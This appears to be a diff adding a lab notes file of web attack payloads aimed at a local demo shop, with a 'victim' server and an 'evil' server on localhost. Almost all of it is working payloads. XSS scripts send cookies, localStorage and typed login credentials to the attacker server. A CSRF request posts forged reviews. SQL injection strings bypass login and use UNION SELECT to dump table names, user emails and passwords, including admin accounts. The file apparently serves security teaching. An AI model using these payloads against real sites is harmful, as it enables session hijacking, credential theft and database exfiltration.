@@ -1,0 +1,59 @@
+- victim server: index.js, port 3000
+- evil server: evil.js, port 4000
+
+- xss : 
+* Reflected XSS: Homepage, textbox name
++ Test
+<script>alert('xss')</script>
++ Hack: 
+* <script>let i = new Image(); i.src = "http://localhost:4000/getcookie?cookie=" + 		escape(document.cookie);</script>
+* xem cookie tu trang chu evil server
+http://localhost:4000/
+
+* Stored XSS: Product details, textbox review
++ Test
+<script>alert("xss")</script>
++ Hack: 
+* <script>let i = new Image(); i.src = "http://localhost:4000/getcookie?cookie=" + 		escape(document.cookie);</script>
+
+* <script>
+    document.querySelector("#loginModal form").addEventListener("submit", function () {
+        let username = document.getElementById("username").value;
+        let password = document.getElementById("password").value;
+        let img = new Image();
+        img.src = "http://localhost:4000/getcookie?cookie=" + escape(username + "-" + password);
+    });
+</script>
+
+* <script>let i = new Image(); i.src = "http://localhost:4000/getcookie?cookie=" + 		escape(JSON.stringify(localStorage));</script>
+
+- CSRF
+Demo CSRF <script>fetch("/products", {
+    method: "POST", 
+    headers: {
+      "Content-Type": "application/json", 
+    },
+    body: JSON.stringify({ review: "You have been hacked!", id: 2}), 
+  });
+</script>
+
+- sql injection: Login, Products
++ Test: textbox: '
+
++ By pass login without username & password, Login page
+username & password: ' or '='
+
++ Products page, browse category url
+
+# Lay ten tat ca tables co trong csdl
+ UNION SELECT ALL 1,array_to_string(array_agg(table_name),','),0,'https://dummyimage.com/150' FROM information_schema.tables
+# Lay ten tat ca columns co trong bang Users
+ UNION SELECT ALL 1,array_to_string(array_agg(column_name),','),0,'https://dummyimage.com/150' FROM information_schema.
+ columns WHERE table_schema = 'public' AND table_name = 'Users'
+# Lay du lieu email va password trong bang Users
+ UNION SELECT ALL 1,concat(email, ' - ', password), 0,'https://dummyimage.com/150' FROM public."Users"
+# Lay du lieu email va password trong bang Users co isAdmin la trues
+ UNION SELECT ALL 1,concat(email, ' - ', password), 0,'https://dummyimage.com/150' FROM public."Users" WHERE "isAdmin"=true
+
++ Insert Review
+' || (SELECT concat(array_to_string(array_agg(email),','), ';', array_to_string(array_agg(password),',')) FROM public."Users") || '
